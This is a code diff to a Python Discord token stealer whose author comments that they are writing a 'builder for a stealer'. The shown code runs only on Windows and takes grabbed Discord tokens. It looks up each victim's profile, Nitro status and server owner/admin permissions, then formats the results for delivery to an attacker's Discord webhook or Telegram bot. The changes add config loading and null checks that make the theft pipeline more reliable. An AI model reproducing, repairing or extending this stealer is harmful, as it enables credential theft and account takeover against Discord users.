@@ -1,10 +1,12 @@
+try:
+    from config import WEBHOOK_URL, WEBHOOK_STYLE, TELEGRAM_BOT_TOKEN, TELEGRAM_USER_ID, TELEGRAM_STYLE#I am writing a builder for a stealer, it will come in handy later.
+except:
+    WEBHOOK_URL = 'PASTE WEBHOOK HERE'
+    WEBHOOK_STYLE = True
 
-WEBHOOK_URL = 'PASTE WEBHOOK HERE'
-WEBHOOK_STYLE = True
-
-TELEGRAM_STYLE = False
-TELEGRAM_BOT_TOKEN = 'PASTE BOT TOKEN: https://t.me/botfather'
-TELEGRAM_USER_ID = 'PASTE U CHAT ID: https://t.me/getmyid_bot'
+    TELEGRAM_STYLE = False
+    TELEGRAM_BOT_TOKEN = 'PASTE BOT TOKEN: https://t.me/botfather'
+    TELEGRAM_USER_ID = 'PASTE U CHAT ID: https://t.me/getmyid_bot'
 
 import os
 if os.name != "nt": exit()
@@ -88,7 +90,7 @@ def token_guildPerm(token):
             wait = json.loads(guilds_response.data)
             time.sleep(float(wait['retry_after']/1000))
         else:
-            continue
+            return None
     guilds = json.loads(guilds_response.data)
     return guilds
 
@@ -106,6 +108,7 @@ def telegramMessage(tokens_grabbed : dict, simple_message = False):
                 #get user id info
                 userdata = token_userData(token)
                 id = userdata['id']
+                if not userdata: continue
                 if id not in list(data['members'].keys()):
                     data['members'][id] = {}
                     data['members'][id]['tokens'] = [f'{token}']
@@ -125,6 +128,7 @@ User Mention:][{userdata['username']}#{userdata['discriminator']}]
 [Nitro Status:][{nitro}]'''
 
                     guilds = token_guildPerm(token)#get guilds info (admin , owner perm.)
+                    if not guilds: continue
                     hp = '\n- Permissions:\n\n'
                     owner = '\n- [OWNER]\n'
                     admin = '\n- [ADMINISTRATOR]\n'
@@ -167,6 +171,7 @@ def discordMessage(tokens_grabbed : dict, simple_embed = False):#return embed li
             for token in tokens_grabbed[app]:
                 #get user id info
                 userdata = token_userData(token)
+                if not userdata: continue
                 id = userdata['id']
                 if id not in list(data['members'].keys()):
                     data['members'][id] = {}
@@ -188,6 +193,7 @@ def discordMessage(tokens_grabbed : dict, simple_embed = False):#return embed li
 [Nitro Status:][{nitro}]```'''
 
                     guilds = token_guildPerm(token)#get guilds info (admin , owner perm.)
+                    if not guilds: continue
                     hp = '```diff\n- Permissions:\n```\n'
                     owner = '```diff\n- [OWNER]\n'
                     admin = '```diff\n- [ADMINISTRATOR]\n'
